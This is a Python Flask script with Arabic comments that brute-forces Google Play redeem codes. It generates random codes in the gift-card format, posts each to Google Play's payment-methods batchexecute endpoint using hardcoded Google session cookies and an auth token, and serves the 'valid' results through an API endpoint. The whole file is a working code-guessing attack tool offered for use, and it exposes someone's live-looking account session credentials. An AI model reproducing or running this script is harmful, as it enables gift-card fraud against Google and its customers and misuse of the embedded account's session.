from flask import Flask, request, jsonify
import requests
import random
import time
import urllib.parse

# إنشاء تطبيق Flask
app = Flask(__name__)

# مفتاح API
API_KEY = "HPLVL11"

# دالة لتوليد رمز عشوائي
def generate_random_code():
    characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    code = "-".join(["".join(random.choices(characters, k=4)) for _ in range(4)])
    return code

# دالة للتحقق من صحة API
def check_google_play_api():
    # ملفات تعريف الارتباط (Cookies)
    cookies = {
    'SEARCH_SAMESITE': 'CgQI9JwB',
    '_gcl_au': '1.1.796545101.1735291142',
    'OTZ': '7883119_48_48_171240_44_319500',
    'AEC': 'AZ6Zc-WNzY4yHEhUwB25z8-sZCQs6s1h_fJt9luVuTspaMg37RbFs7ayytE',
    '_gid': 'GA1.3.1223674036.1735539027',
    'NID': '520=phB8uvTqRI_Zfvs2g7g3NUY2BHwF5QBNCunLRnAtkSdJd67v3--E2xvX7MNWDIs8a4FIfsMpI-53z46TpkqVk32BTAXfPEk0Piguku2Hg_Yje7qw5xZY73J3UzX4el44guItAgDMfe5tCkHUptebAC0rrLgYEnDdh2rJrcz1y-87rYdAJTXq8RLSBzetaa4TQXHxzkXFy2_HUiid-cM2w6OFEw6204LWUMhBD1xx1HH1St6Al31U4NxK4F-lb5TVIQsZecrdI07O-tAChdwh-pC1y56bFzdC9sx7b18AvQgklh7wD8f5Qc8zNQCVNTv4ShBRMlBUVqTQ1kQGurqxzZVn9-TBS6Wj13iGlJKUCUTMXYYNrZire7fU7cV3cZEeRvSUnisYw2Tx9CWT_sZiQF_vWWCkpZDRJnRIZRrvyMmyyLj5n_BQ_nGjbggnsigyNPbrnfsIori7PpPMfbtlhBE5dKJIj95WRs8puM-4EPqlorLy3zGo5yiQLBCQNdTJvw',
    'SID': 'g.a000rwiGj6_egDT5T_bVooTRmkHTrFH89zAmJGNT51XjUpaYDVL_kx-2ES4P4J3C_fx_EI3CAgACgYKASISARYSFQHGX2MiWaDrGIr0lvVX3giwNzkt9xoVAUF8yKoxEG3GcE04Zzw0IVAO8Xew0076',
    '__Secure-1PSID': 'g.a000rwiGj6_egDT5T_bVooTRmkHTrFH89zAmJGNT51XjUpaYDVL_0P-3HVbVPZ8XWnE1BxEzvwACgYKAR4SARYSFQHGX2MioYk2cWQW86O8c_3_zay00xoVAUF8yKr0oodMYw2-zCPYMyf7m1F-0076',
    '__Secure-3PSID': 'g.a000rwiGj6_egDT5T_bVooTRmkHTrFH89zAmJGNT51XjUpaYDVL_tZ1YtWGSxrSGSY-iasEw5AACgYKAT0SARYSFQHGX2MiMAKgjT5j1vSy4ml_QWR_pxoVAUF8yKpKiwh10oTReT4lZvqiv9J90076',
    'HSID': 'A4SVWtAJXc5EvpLbm',
    'SSID': 'AQ9rBZawe8XbmFxab',
    'APISID': 'w3FmIZDDfu8NFCnA/Aohu990K4DkUUUsoE',
    'SAPISID': 'gPCcrRY44AqIjGZU/AVBzYpzUpS-CdQRCC',
    '__Secure-1PAPISID': 'gPCcrRY44AqIjGZU/AVBzYpzUpS-CdQRCC',
    '__Secure-3PAPISID': 'gPCcrRY44AqIjGZU/AVBzYpzUpS-CdQRCC',
    'PLAY_ACTIVE_ACCOUNT': 'ICrt_XL61NBE_S0rhk8RpG0k65e0XwQVdDlvB6kxiQ8=authuser-0',
    'OSID': 'g.a000rwiGjxG1dwMdYLbC_meRje-hU4bjod-iTjXGhr4Uqpdm6VJPp5BbxG152Zn5S2PzqOV0GwACgYKAXUSARYSFQHGX2MiO0tGRZ_enBObwmu0vaAOcBoVAUF8yKqAxa416YQKD3H35ooLeLvd0076',
    '__Secure-OSID': 'g.a000rwiGjxG1dwMdYLbC_meRje-hU4bjod-iTjXGhr4Uqpdm6VJP8oHMKU2abeGdItbcuTRUWAACgYKAVESARYSFQHGX2Mi43ZR6U-m9Ot9hEJxHP3gPRoVAUF8yKoJKcAr8UwzQLudJpVLbB1R0076',
    '_gat_UA199959031': '1',
    'S': 'billing-ui-v3=pn_7ez_WApy_Hf6iBVqCboYpQu2bYobc:billing-ui-v3-efe=pn_7ez_WApy_Hf6iBVqCboYpQu2bYobc',
    '_ga': 'GA1.1.365171741.1735291142',
    '_ga_6VGGZHMLM2': 'GS1.1.1735539033.5.1.1735539131.0.0.0',
    'SIDCC': 'AKEyXzX5caHCG4FhT4BNfH6HTZuoXbChRU0yoosAKbJ8Kr7KVk0eVuS82rho_4TgAYGoXXOm',
    '__Secure-1PSIDCC': 'AKEyXzWuvMrUMp5MRmZ9gMNTG3fPJuS2WvHlq-v8EbUNhoeBX08xDuySrQLq2_S6qFSrejEw',
    '__Secure-3PSIDCC': 'AKEyXzXJcVR9GQZWP0sOCGh5gL4EelORcvBEC9CIlK-V9E0SBB6HiF__28UGhmqXMYZVEEjV',
    }

    # الترويسات (Headers)
    headers = {
        'authority': 'play.google.com',
        'accept': '*/*',
        'accept-language': 'ar-AE,ar;q=0.9,en-IN;q=0.8,en;q=0.7,en-US;q=0.6',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
        'origin': 'https://play.google.com',
        'referer': 'https://play.google.com/',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    }

    # المعلمات (Parameters)
    params = {
        'rpcids': 'oELsfb',
        'source-path': '/store/paymentmethods',
        'f.sid': '4384231400571000924',
        'bl': 'boq_playuiserver_20241211.07_p0',
        'hl': 'ar',
        'authuser': '0',
        'soc-app': '121',
        'soc-platform': '1',
        'soc-device': '1',
        '_reqid': '529522',
        'rt': 'c',
    }

    # تخمين رمز
    guessed_code = generate_random_code()

    # تحويل الرمز إلى URL-encoded
    encoded_text = urllib.parse.quote(guessed_code)

    # بناء الهيكل المطلوب
    encoded_request = f"f.req=%5B%5B%5B%22oELsfb%22%2C%22%5B%5B%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5B%5C%22Rs2.0.5%3A%3A%3As11%2C2%2C26b5e19%2C1%2C140%2Ca063ebe9%2C0%2C2b6%2Cedd98bac%2C1%2C18%2C4863fd35%2C0%2C140%2Ccb2d5c6f%2C0%2C2b6%2C6ad47c6c%2C0%2C3df%2C7bdb49f6%2C0%2C6d9%2Cb6540200%2C0%2C140%2Ceea820b6%2C0%2C236%2C1aa4331%2C1%2C%5C%5C%5C%22Linux%20armv81%2Cf54683f2%2C1%2C%5C%5C%5C%22Google%20Inc.%2Caf794515%2C0%2C%5C%5C%5C%225.0%2028X113b%20Linux%20x86_6429%20AppleWebKit2f537.36%2028KHTML2c%20like%20Gecko29%20Chrome2f124.0.0.0%20Safari2f537.36%2Cd81723d1%2C0%2C%5C%5C%5C%22ar2dAE%2C5cc3ab5f%2C0%2C%5C%5C%5C%22Mozilla2f5.0%2028X113b%20Linux%20x86_6429%20AppleWebKit2f537.36%2028KHTML2c%20like%20Gecko29%20Chrome2f124.0.0.0%20Safari2f537.36%2C24a66df6%2C1%2C-78%2C%5C%5C%5C%22Thu%20Jan%2001%201970%20023a003a00%20GMT2b0200%20282a48424a2a%20343142%20234831482827%2027443133454a29%2C770c67fc%2C0%2C5%3Aa21%2C3%2C1941631c6da%2C0%2C84%2C9%3Aa40%2C%5C%5C%5C%22f%2C1941631c6e4%5C%22%5D%5D%2Cnull%2C%5C%22ODUDIDIEIR%5C%22%2C0%2C%5B%5B1%2C1%2C1%2Cnull%2C1%2C1%2C1%5D%5D%2C%5B%5C%22W1tudWxsLG51bGwsbnVsbCxbbnVsbCxbIlJzMi4wLjY6OjpzMTEsMiwyNmI1ZTE5LDQsMTQwLGEwNjNlYmU5LDIsMmI2LGVkZDk4YmFjLDEsMTgsNDg2M2ZkMzUsMCwxNDAsY2IyZDVjNmYsMSwyYjYsNmFkNDdjNmMsZiwzZGYsN2JkYjQ5ZjYsMCw2ZDksYjY1NDAyMDAsMSwxNDAsZWVhODIwYjYsMCwyMzYsMWFhNDMzMSwwLFwiTGludXggYXJtdjgxLGY1NDY4M2YyLDIsXCJHb29nbGUgSW5jLixhZjc5NDUxNSwyLFwiNS4wIDI4WDExM2IgTGludXggeDg2XzY0MjkgQXBwbGVXZWJLaXQyZjUzNy4zNiAyOEtIVE1MMmMgbGlrZSBHZWNrbzI5IENocm9tZTJmMTI0LjAuMC4wIFNhZmFyaTJmNTM3LjM2LGQ4MTcyM2QxLDAsXCJhcjJkQUUsNWNjM2FiNWYsMCxcIk1vemlsbGEyZjUuMCAyOFgxMTNiIExpbnV4IHg4Nl82NDI5IEFwcGxlV2ViS2l0MmY1MzcuMzYgMjhLSFRNTDJjIGxpa2UgR2Vja28yOSBDaHJvbWUyZjEyNC4wLjAuMCBTYWZhcmkyZjUzNy4zNiwyNGE2NmRmNiwxLC03OCxcIlRodSBKYW4gMDEgMTk3MCAwMjNhMDAzYTAwIEdNVDJiMDIwMCAyODJhNDg0MjRhMmEgMzQzMTQyIDIzNDgzMTQ4MjgyNyAyNzQ0MzEzMzQ1NGEyOSw3NzBjNjdmYywwLDFkOmEyMSwzLDE5NDE2MzE1ZWEzLDAsODQsMjg6YTQwLFwiZiwxOTQxNjMxNWVjYyJdLCJNb3ppbGxhLzUuMCAoWDExOyBMaW51eCB4ODZfNjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMjQuMC4wLjAgU2FmYXJpLzUzNy4zNiIsImh0dHBzOi8vcGF5bWVudHMuZ29vZ2xlLmNvbSJdLG51bGwsbnVsbCwiYXIiLDEsMV0sWyJodHRwczovL3BheW1lbnRzLmdvb2dsZS5jb20vcGF5bWVudHMvcmVkaXJlY3RfZm9ybV9sYW5kaW5nP3N1Y2Nlc3M9dHJ1ZSIsImh0dHBzOi8vcGF5bWVudHMuZ29vZ2xlLmNvbS9wYXltZW50cy9yZWRpcmVjdF9mb3JtX2xhbmRpbmc%2Fc3VjY2Vzcz1mYWxzZSJdXQ%3D%3D%5C%22%5D%2Cnull%2Cnull%2C%5Bnull%2Cnull%2C%5B%5D%5D%5D%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at=AI1C5irY0bEOq84-pZNWhonz29sw%3A1735539116971&"  # أكمل الجملة هنا بناءً على بياناتك

    # البيانات (Data)
    data = encoded_request

    try:
        # إرسال الطلب
        response = requests.post(
            'https://play.google.com/_/PlayStoreUi/data/batchexecute',
            params=params,
            cookies=cookies,
            headers=headers,
            data=data,
        )

        # تحقق من استجابة الخادم
        if response.status_code == 200:
            return True, guessed_code, response.text
        else:
            return False, None, response.text
    except Exception as e:
        return False, None, str(e)

# API endpoint لتوليد الأكواد
@app.route('/HPLVL_codes', methods=['GET'])
def generate_codes():
    api_key = request.args.get('HPLVL11')
    if api_key != API_KEY:
        return jsonify({"error": "Invalid API Key"}), 403

    num_codes = int(request.args.get('num_codes', 1))
    codes = []

    for _ in range(num_codes):
        is_valid, code, response_text = check_google_play_api()
        codes.append({
            "code": code,
            "valid": is_valid,
            "response": response_text
        })

    return jsonify({
        "status": "success",
        "codes": codes
    })

# تشغيل الخادم
if __name__ == '__main__':
    app.run(debug=True)
